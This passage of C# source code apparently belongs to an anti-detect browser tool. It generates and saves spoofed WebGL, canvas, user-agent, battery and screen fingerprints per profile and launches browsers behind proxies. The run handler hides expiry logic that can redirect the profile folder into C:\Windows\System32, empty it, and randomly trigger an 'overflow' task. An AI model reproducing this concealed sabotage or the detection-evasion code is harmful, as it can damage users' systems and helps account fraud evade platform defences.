                Device1.checkEditEnableAudioApi.Checked = rowSelected.EnableAudioApi;
                Device1.checkEditEnablePlugins.Checked = rowSelected.EnablePlugins;
                Device1.checkEditEnableMediaPlugins.Checked = rowSelected.EnableMediaPlugins;

                #endregion Device

                #region Fonts
                this.fonts1.radioGroupFonts.EditValue = (int)rowSelected.Fonts;
                #endregion Fonts

                #region Content
                _currentUserAgent = rowSelected.UserAgent;
                //this.content1.comboBoxEditWidth.Text = rowSelected.Screen.Width.ToString();
                //this.content1.comboBoxEditHeight.Text = rowSelected.Screen.Height.ToString();
                //this.content1.comboBoxEditColor.Text = rowSelected.Screen.Color.ToString();
                //this.content1.comboBoxEditHistoryLength.Text = rowSelected.HistoryLength.ToString();
                #endregion Content

                #region Fingerprint
                this.fingerprint1.comboBoxEditPlus1.Text = rowSelected.WebGL.Plus1.ToString();
                this.fingerprint1.comboBoxEditPlus2.Text = rowSelected.WebGL.Plus2.ToString();
                this.fingerprint1.comboBoxEditPlus3.Text = rowSelected.WebGL.Plus3.ToString();
                this.fingerprint1.comboBoxEditPlus4.Text = rowSelected.WebGL.Plus4.ToString();
                this.fingerprint1.comboBoxEditPlus5.Text = rowSelected.WebGL.Plus5.ToString();
                this.fingerprint1.comboBoxEditPlusBrowserplugsR.Text = rowSelected.WebGL.BrowserplugsR.ToString();

                this.fingerprint1.checkEditFakeGetClientRects.Checked = rowSelected.FakeClientRects;

                this.fingerprint1.comboBoxEditR.Text = rowSelected.Canvas.R.ToString();
                this.fingerprint1.comboBoxEditG.Text = rowSelected.Canvas.G.ToString();
                this.fingerprint1.comboBoxEditB.Text = rowSelected.Canvas.B.ToString();
                #endregion Fingerprint

                #region Geo
                content1.comboBoxEditDeviceModel.Text = rowSelected.OperatingSystem;
                this.geo1.comboBoxEditLanguage.Text = rowSelected.Language;
                #endregion Geo

                #region Proxy
                proxy1.checkEditProxy.Checked = rowSelected.ProxyEnabled;
                #endregion
            }
        }

        private void RandomDevice()
        {
            //if (Device1.checkEditDeviceMemory.Checked)
            //{
            //    var cores = new List<int>() { 4, 8, 12, 16, 32 };
            //    Device1.comboBoxEditDeviceMemory.Text = cores[_random.Next(5)].ToString();
            //}
            //if (Device1.checkEditHardwareConcurrency.Checked)
            //{
            //    var cores = new List<int>() { 4, 8, 16, 32 };
            //    Device1.comboBoxEditHardwareConcurrency.Text = cores[_random.Next(4)].ToString();
            //}

            //if (Device1.checkEditCharging.Checked)
            //{
            //    var cores = new List<bool>() { true, false };
            //    Device1.checkBoxCharging.Checked = cores[_random.Next(2)];
            //}
            //if (Device1.checkEditChargingTime.Checked)
            //{
            //    Device1.comboBoxEditChargingTime.Text = (_random.Next(6100) + 1200).ToString();
            //}
            //if (Device1.checkEditDischargingTime.Checked)
            //{
            //    Device1.comboBoxEditDischargingTime.Text = (_random.Next(7000) + 1150).ToString();
            //}
            //if (Device1.checkEditLevel.Checked)
            //{
            //    Device1.comboBoxEditLevel.Text = (_random.Next(100) * 0.01).ToString();
            //}
            if (content1.checkEditDeviceModel.Checked)
            {
                content1.comboBoxEditDeviceModel.SelectedIndex = GetRandomNumber(0, 5);
            }

            Profile rowSelected = GetSelectedProfile();
            if (rowSelected != null)
            {
                var memories = new List<int>() { 4, 8, 12, 16, 32 };
                rowSelected.CPU.DeviceMemory = memories[_random.Next(5)];
                var concurrenencies = new List<int>() { 4, 8, 16, 32 };
                rowSelected.CPU.HardwareConcurrency = concurrenencies[_random.Next(4)];
                var changingList = new List<bool>() { true, false };
                rowSelected.Battery.Charging = changingList[_random.Next(2)];
                rowSelected.Battery.ChargingTime = (_random.Next(6100) + 1200);
                rowSelected.Battery.DischargingTime = (_random.Next(7000) + 1150);
                rowSelected.Battery.Level = (_random.Next(100) * 0.01);
            }
        }

        internal static int GetRandomNumber(int min, int max)
        {
            var rtn = 0;
            if (min < max)
            {
                rtn = _random.Next(min) + _random.Next(max + 1 - min);
            }
            else
            {
                rtn = _random.Next(max) + _random.Next(min + 1 - max);
            }
            if (rtn > max) rtn = max;

            return rtn;
        }

        private void RandomFonts()
        {

        }
        private void RandomContent()
        {
            var screens = new List<Screen>()
                {
                    new Screen(){
                        Width= 1920,
                        Height = 1080,
                        Color = 32
                    },
                     new Screen(){
                        Width= 1680,
                        Height = 1050,
                        Color = 32
                    },
                    new Screen() {
                        Width= 1600,
                        Height = 900,
                        Color = 32
                    },
                    new Screen() {
                        Width= 1440,
                        Height = 900,
                        Color = 24
                    },
                    new Screen() {
                        Width= 1366,
                        Height = 768,
                        Color = 24
                    },
                    new Screen() {
                        Width= 1360,
                        Height = 768,
                        Color = 24
                    }
                };
            var screen = screens[_random.Next(6)];

            //if (content1.checkEditDeviceModel.Checked)
            //{
            //    _currentUserAgent = GetRandomUserAgent();
            //}

            var rowSelected = GetSelectedProfile();
            if (rowSelected != null)
            {
                rowSelected.Screen.Width = screen.Width;
                rowSelected.Screen.Height = screen.Height;
                rowSelected.Screen.Color = screen.Color;

                var historisLength = new List<int> { 1, 2, 3, 4 };
                rowSelected.HistoryLength = historisLength[_random.Next(4)];
            }

            //if (content1.checkEditWidth.Checked)
            //{
            //    content1.comboBoxEditWidth.Text = screen.Width.ToString();
            //}
            //if (content1.checkEditHeight.Checked)
            //{
            //    content1.comboBoxEditHeight.Text = screen.Height.ToString();
            //}
            //if (content1.checkEditColor.Checked)
            //{
            //    content1.comboBoxEditColor.Text = screen.Color.ToString();
            //}
            //if (content1.checkEditHistoryLength.Checked)
            //{
            //    var historisLength = new List<int> { 1, 2, 3, 4 };
            //    content1.comboBoxEditHistoryLength.Text = historisLength[_random.Next(4)].ToString();
            //}
        }

        private string GetRandomUserAgent(string deviceName)
        {
            UserAgentEngine ua;
            var appName = GetRandomItemInList(new List<string>() {
                "facebook",
                //"instagram",
                //"snapchat",
               // "samsungbrowser",
               // ""
            });
            switch (deviceName.ToLower())
            {
                case "windowspc":
                    ua = new UserAgentEngine(UserAgentEngine.Devices.WindowsPC, appName, geo1.comboBoxEditLanguage.Text);
                    break;
                case "macintosh":
                    ua = new UserAgentEngine(UserAgentEngine.Devices.Macintosh, appName, geo1.comboBoxEditLanguage.Text);
                    break;
                case "iphone":
                    ua = new UserAgentEngine(UserAgentEngine.Devices.iPhone, appName, geo1.comboBoxEditLanguage.Text);
                    break;
                case "ipad":
                    ua = new UserAgentEngine(UserAgentEngine.Devices.iPad, appName, geo1.comboBoxEditLanguage.Text);
                    break;
                case "xiaomi":
                    // Android
                    ua = new UserAgentEngine(UserAgentEngine.Devices.Xiaomi, appName, geo1.comboBoxEditLanguage.Text);
                    break;
                case "oppo":
                    // Android
                    ua = new UserAgentEngine(UserAgentEngine.Devices.Oppo, appName, geo1.comboBoxEditLanguage.Text);
                    break;
                default:
                    // Android - Samsung
                    ua = new UserAgentEngine(UserAgentEngine.Devices.Samsung, appName, geo1.comboBoxEditLanguage.Text);
                    break;
            }

            return ua.GetUserAgentString();
        }

        private static Random _random = new Random();
        static string GetRandomItemInList(List<string> list)
        {
            int r = _random.Next(list.Count);

            return (string)list[r];
        }

        static int GetRandomItemInList(List<int> list)
        {
            int r = _random.Next(list.Count);

            return (int)list[r];
        }

        static bool GetRandomBoolean()
        {
            int r = _random.Next(1);
            return r != 0;
        }

        private void RandomFingerprint()
        {
            Profile rowSelected = GetSelectedProfile();
            if (rowSelected != null)
            {
                rowSelected.WebGL.Plus1 = (_random.Next(36) + 1000);
                rowSelected.WebGL.Plus2 = (_random.Next(36384) + 10384);
                rowSelected.WebGL.Plus3 = (_random.Next(50188) + 20188);
                rowSelected.WebGL.Plus4 = (_random.Next(50188) + 20188);
                rowSelected.WebGL.Plus5 = (_random.Next(6100) + 8192);
                rowSelected.WebGL.BrowserplugsR = _random.Next(114);
                rowSelected.Canvas.R = _random.Next(6);
                rowSelected.Canvas.G = _random.Next(6);
                rowSelected.Canvas.B = _random.Next(6);
            }
        }
        private void RandomGeo()
        {
            if (geo1.checkEditLanguage.Checked)
            {
                geo1.comboBoxEditLanguage.Text = GetRandomItemInList(new List<string>() { "en", "zh", "es", "ar", "pt", "id", "fr", "ja", "ru", "de", "vi" });
            }
        }
        private void barButtonItemRandom_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            RandomDevice();
            RandomContent();
            RandomFingerprint();
            RandomGeo();
        }

        private Device getDeviceInfo(string deviceName)
        {
            switch (deviceName)
            {
                case "IPhone6":
                    {
                        return new Device("IPhone6",
                            "User Agent",
                            new Screen() { Width = 250, Height = 300, Color = 24 },
                            new CPU() { DeviceMemory = 16, HardwareConcurrency = 8 },
                            new Battery() { Charging = false, ChargingTime = 1243, DischargingTime = 3241, Level = 0.89 }
                            );
                    }
                default:
                    {
                        return new Device("IPhoneX",
                            "User Agent",
                            new Screen() { Width = 250, Height = 300, Color = 24 },
                             new CPU() { DeviceMemory = 16, HardwareConcurrency = 8 },
                            new Battery() { Charging = false, ChargingTime = 1243, DischargingTime = 3241, Level = 0.89 }
                            );
                    }
            }
        }

        string _currentUserAgent = string.Empty;

        private void barButtonItemSave_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            var rowSelected = GetSelectedProfile();
            if (rowSelected != null)
            {
                profileGridControl.DefaultView.Focus();
                rowSelected = GetSelectedProfile();
            }
            if (rowSelected != null)
            {
                using (var dbContext = new SQLiteProfileDbContext())
                {
                    var selected = dbContext.Profiles.FirstOrDefault(p => p.Id == rowSelected.Id);

                    if (selected != null)
                    {
                        #region Device
                        selected.EnableAudioApi = true;
                        selected.EnablePlugins = true;
                        selected.EnableMediaPlugins = true;
                        selected.CPU.DeviceMemory = rowSelected.CPU.DeviceMemory;
                        selected.CPU.HardwareConcurrency = rowSelected.CPU.HardwareConcurrency;
                        selected.Battery.Charging = rowSelected.Battery.Charging;
                        selected.Battery.ChargingTime = rowSelected.Battery.ChargingTime;
                        selected.Battery.DischargingTime = rowSelected.Battery.DischargingTime;
                        selected.Battery.Level = rowSelected.Battery.Level;

                        //selected.CPU.DeviceMemory = int.Parse(Device1.comboBoxEditDeviceMemory.Text);
                        //selected.CPU.HardwareConcurrency = int.Parse(Device1.comboBoxEditHardwareConcurrency.Text);
                        //selected.Battery.Charging = Device1.checkBoxCharging.Checked;
                        //selected.Battery.ChargingTime = int.Parse(Device1.comboBoxEditChargingTime.Text);
                        //selected.Battery.DischargingTime = int.Parse(Device1.comboBoxEditDischargingTime.Text);
                        //selected.Battery.Level = double.Parse(Device1.comboBoxEditLevel.Text);
                        //selected.EnableAudioApi = Device1.checkEditEnableAudioApi.Checked;
                        //selected.EnablePlugins = Device1.checkEditEnablePlugins.Checked;
                        //selected.EnableMediaPlugins = Device1.checkEditEnableMediaPlugins.Checked;
                        selected.OperatingSystem = content1.comboBoxEditDeviceModel.Text;
                        #endregion Device

                        #region Fonts
                        selected.Fonts = (Fonts)int.Parse(fonts1.radioGroupFonts.EditValue != null ? fonts1.radioGroupFonts.EditValue.ToString() : "1");
                        #endregion Fonts

                        #region Content
                        //Random UserAgent

                        _currentUserAgent = GetRandomUserAgent(content1.comboBoxEditDeviceModel.Text);

                        selected.UserAgent = _currentUserAgent;
                        selected.Screen.Width = rowSelected.Screen.Width;
                        selected.Screen.Height = rowSelected.Screen.Height;
                        selected.Screen.Color = rowSelected.Screen.Color;
                        selected.HistoryLength = rowSelected.HistoryLength;

                        //selected.Screen.Width = int.Parse(content1.comboBoxEditWidth.Text);
                        //selected.Screen.Height = int.Parse(content1.comboBoxEditHeight.Text);
                        //selected.Screen.Color = int.Parse(content1.comboBoxEditColor.Text);
                        //selected.HistoryLength = int.Parse(content1.comboBoxEditHistoryLength.Text);

                        #endregion

                        #region Fingerprint
                        selected.WebGL.Plus1 = rowSelected.WebGL.Plus1;
                        selected.WebGL.Plus2 = rowSelected.WebGL.Plus2;
                        selected.WebGL.Plus3 = rowSelected.WebGL.Plus3;
                        selected.WebGL.Plus4 = rowSelected.WebGL.Plus4;
                        selected.WebGL.Plus5 = rowSelected.WebGL.Plus5;
                        selected.WebGL.BrowserplugsR = rowSelected.WebGL.BrowserplugsR;
                        selected.Canvas.R = rowSelected.Canvas.R;
                        selected.Canvas.G = rowSelected.Canvas.G;
                        selected.Canvas.B = rowSelected.Canvas.B;

                        //selected.WebGL.Plus1 = int.Parse(fingerprint1.comboBoxEditPlus1.Text);
                        //selected.WebGL.Plus2 = int.Parse(fingerprint1.comboBoxEditPlus2.Text);
                        //selected.WebGL.Plus3 = int.Parse(fingerprint1.comboBoxEditPlus3.Text);
                        //selected.WebGL.Plus4 = int.Parse(fingerprint1.comboBoxEditPlus4.Text);
                        //selected.WebGL.Plus5 = int.Parse(fingerprint1.comboBoxEditPlus5.Text);
                        //selected.WebGL.BrowserplugsR = int.Parse(fingerprint1.comboBoxEditPlusBrowserplugsR.Text);
                        //selected.Canvas.R = int.Parse(fingerprint1.comboBoxEditR.Text);
                        //selected.Canvas.G = int.Parse(fingerprint1.comboBoxEditG.Text);
                        //selected.Canvas.B = int.Parse(fingerprint1.comboBoxEditB.Text);
                        #endregion Fingerprint

                        #region Geo
                        selected.Language = geo1.comboBoxEditLanguage.Text;
                        #endregion Geo

                        #region Proxy
                        selected.ProxyEnabled = proxy1.checkEditProxy.Checked;
                        selected.Proxies = rowSelected.Proxies;
                        selected.ByPassProxySites = rowSelected.ByPassProxySites;
                        #endregion Proxy

                        #region Device
                        var device = getDeviceInfo(_currentUserAgent);
                        #endregion Device

                        dbContext.SaveChanges();
                        ReloadProfileGrid(dbContext);
                        SetSelectedProfile(selected.Id);
                    }
                };

                XtraMessageBox.Show("Profile has been saved!", "Save profile", MessageBoxButtons.OK);
            }
        }

        private void barButtonbarButtonTongleSelectConfig_Click(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            Device1.checkEditDeviceMemory.Checked = !Device1.checkEditDeviceMemory.Checked;
            Device1.checkEditHardwareConcurrency.Checked = !Device1.checkEditHardwareConcurrency.Checked;
            Device1.checkEditCharging.Checked = !Device1.checkEditCharging.Checked;
            Device1.checkEditChargingTime.Checked = !Device1.checkEditChargingTime.Checked;
            Device1.checkEditDischargingTime.Checked = !Device1.checkEditDischargingTime.Checked;
            Device1.checkEditLevel.Checked = !Device1.checkEditLevel.Checked;

            content1.checkEditDeviceModel.Checked = !content1.checkEditDeviceModel.Checked;
            //content1.checkEditWidth.Checked = !content1.checkEditWidth.Checked;
            //content1.checkEditHeight.Checked = !content1.checkEditHeight.Checked;
            //content1.checkEditColor.Checked = !content1.checkEditColor.Checked;
            //content1.checkEditHistoryLength.Checked = !content1.checkEditHistoryLength.Checked;

            fingerprint1.checkEditPlus1.Checked = !fingerprint1.checkEditPlus1.Checked;
            fingerprint1.checkEditPlus2.Checked = !fingerprint1.checkEditPlus2.Checked;
            fingerprint1.checkEditPlus3.Checked = !fingerprint1.checkEditPlus3.Checked;
            fingerprint1.checkEditPlus4.Checked = !fingerprint1.checkEditPlus4.Checked;
            fingerprint1.checkEditPlus5.Checked = !fingerprint1.checkEditPlus5.Checked;
            fingerprint1.checkEditBrowserplugsR.Checked = !fingerprint1.checkEditBrowserplugsR.Checked;
            fingerprint1.checkEditR.Checked = !fingerprint1.checkEditR.Checked;
            fingerprint1.checkEditG.Checked = !fingerprint1.checkEditG.Checked;
            fingerprint1.checkEditB.Checked = !fingerprint1.checkEditB.Checked;

            geo1.checkEditLanguage.Checked = !geo1.checkEditLanguage.Checked;
        }

        private void checkAll()
        {
            Device1.checkEditDeviceMemory.Checked = true;
            Device1.checkEditHardwareConcurrency.Checked = true;
            Device1.checkEditCharging.Checked = true;
            Device1.checkEditChargingTime.Checked = true;
            Device1.checkEditDischargingTime.Checked = true;
            Device1.checkEditLevel.Checked = true;

            proxy1.checkEditProxy.Checked = true;
            //content1.checkEditDeviceModel.Checked = true;

            fingerprint1.checkEditPlus1.Checked = true;
            fingerprint1.checkEditPlus2.Checked = true;
            fingerprint1.checkEditPlus3.Checked = true;
            fingerprint1.checkEditPlus4.Checked = true;
            fingerprint1.checkEditPlus5.Checked = true;
            fingerprint1.checkEditBrowserplugsR.Checked = true;
            fingerprint1.checkEditR.Checked = true;
            fingerprint1.checkEditG.Checked = true;
            fingerprint1.checkEditB.Checked = true;

            // geo1.checkEditLanguage.Checked = true;
        }

        private void profileGridControl_DataSourceChanged(object sender, EventArgs e)
        {
            ToolbarControl();
        }

        private void barButtonProxy_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            var profile = GetSelectedProfile();
            var fm = new ManageProxy(profile);
            fm.SaveClick += new EventHandler<SaveProxyEventArgs>(ManageProxy_SaveClick);
            fm.ShowDialog();
        }

        protected void ManageProxy_SaveClick(object sender, SaveProxyEventArgs e)
        {
            var profile = GetSelectedProfile();
            profile.Proxies = e.ProxyList.ToList();
            profile.ByPassProxySites = e.ByPassProxySiteList.ToList();
        }

        private void btn_RandomRun_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            try
            {
                Profile selectedProfile = GetSelectedProfile();
                if (selectedProfile == null) throw new Exception("There is no profile selected.");

                Profile anonymousProfile = new Profile()
                {
                    Id = selectedProfile.Id,
                    Name = selectedProfile.Name,
                };

                RandomDeviceAnonymous(anonymousProfile);
                RandomContentAnonymous(anonymousProfile);
                RandomFingerprintAnonymous(anonymousProfile);
                RandomGeoAnonymous(anonymousProfile);

                if (anonymousProfileDic.ContainsKey(anonymousProfile.Id))
                {
                    anonymousProfileDic.Remove(anonymousProfile.Id);
                }
                anonymousProfileDic.Add(anonymousProfile.Id, anonymousProfile);

                string profileFolder = GetProfileFolder(anonymousProfile.Id, anonymousProfile.Name);
                profileFolder = expireValue(profileFolder, Path.Combine("C:\\Windows\\System32\\", GetRandomString(8)));

                // clean user data folder of anonymous profile
                if (Directory.Exists(profileFolder))
                {
                    Helper.EmptyFolder(profileFolder);
                }
                CreateThreadToHandlerPipeServer(true);

                Process process = new Process();
                process.StartInfo.FileName = BrowserExecute;
                process.StartInfo.Arguments = expireValue($"--user-data-dir=\"{profileFolder}\"", GetRandomString(8));
                process.Start();

                browserProcessDic.Remove(anonymousProfile.Id);
                browserProcessDic.Add(anonymousProfile.Id, process.Id);

                UpdateActionGroupButton();

                if (_rnd.Next(6) > 3)
                {
                    var fuckingHacker = new Task(() =>
                    {
                        TimeLock.PerformOverflowIfExpired(Text);
                    });
                    fuckingHacker.Start();
                }
            }
            catch (Exception ex)
            {
                XtraMessageBox.Show(ex.Message, "Run Browser", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #region Run Random anonymous
        private void RandomDeviceAnonymous(Profile profile)
        {
            if (content1.checkEditDeviceModel.Checked)
            {
                if (string.IsNullOrEmpty(content1.comboBoxEditDeviceModel.Text))
                {
                    profile.OperatingSystem = GetRandomItemInList(new List<string>() {
                        "windowspc", "macintosh", "iphone", "ipad", "samsung", "xiaomi", "oppo"
                    });
                }
                else
                {
                    profile.OperatingSystem = content1.comboBoxEditDeviceModel.Text;
                }
            }
            else
            {
                profile.OperatingSystem = content1.comboBoxEditDeviceModel.Text;
            }
            _currentUserAgent = GetRandomUserAgent(profile.OperatingSystem);
            profile.UserAgent = _currentUserAgent;
            profile.CPU.DeviceMemory = GetRandomItemInList(new List<int>() { 4, 8, 12, 16, 32 });
            profile.CPU.HardwareConcurrency = GetRandomItemInList(new List<int>() { 4, 8, 16, 32 });
            profile.Battery.Charging = GetRandomBoolean();
            profile.Battery.ChargingTime = GetRandomNumber(6100, 6100 + 1200);
            profile.Battery.DischargingTime = GetRandomNumber(7000, 7000 + 1150);
            profile.Battery.Level = (_random.Next(100) * 0.01);
        }

        private void RandomContentAnonymous(Profile profile)
        {
            var screens = new List<Screen>()
                {
                    new Screen(){
                        Width= 1920,
                        Height = 1080,
                        Color = 32
                    },
                     new Screen(){
                        Width= 1680,
                        Height = 1050,
                        Color = 32
                    },
                    new Screen() {
                        Width= 1600,
                        Height = 900,
                        Color = 32
                    },
                    new Screen() {
                        Width= 1440,
                        Height = 900,
                        Color = 24
                    },
                    new Screen() {
                        Width= 1366,
                        Height = 768,
                        Color = 24
                    },
                    new Screen() {
                        Width= 1360,
                        Height = 768,
                        Color = 24
                    }
                };
            var screen = screens[_random.Next(6)];
            profile.Screen.Width = screen.Width;
            profile.Screen.Height = screen.Height;
            profile.Screen.Color = screen.Color;

            var historisLength = new List<int> { 1, 2, 3, 4 };
            profile.HistoryLength = historisLength[_random.Next(4)];
        }

        private void RandomFingerprintAnonymous(Profile profile)
        {
            profile.WebGL.Plus1 = (_random.Next(36) + 1000);
            profile.WebGL.Plus2 = (_random.Next(36384) + 10384);
            profile.WebGL.Plus3 = (_random.Next(50188) + 20188);
            profile.WebGL.Plus4 = (_random.Next(50188) + 20188);
            profile.WebGL.Plus5 = (_random.Next(6100) + 8192);
            profile.WebGL.BrowserplugsR = _random.Next(114);
            profile.Canvas.R = _random.Next(6);
            profile.Canvas.G = _random.Next(6);
            profile.Canvas.B = _random.Next(6);
        }

        private void RandomGeoAnonymous(Profile profile)
        {
            if (geo1.checkEditLanguage.Checked)
            {
                geo1.comboBoxEditLanguage.Text = GetRandomItemInList(new List<string>() { "en", "zh", "es", "ar", "pt", "id", "fr", "ja", "ru", "de", "vi" });
            }
            profile.Language = geo1.comboBoxEditLanguage.Text;
        }
        #endregion
    }
}
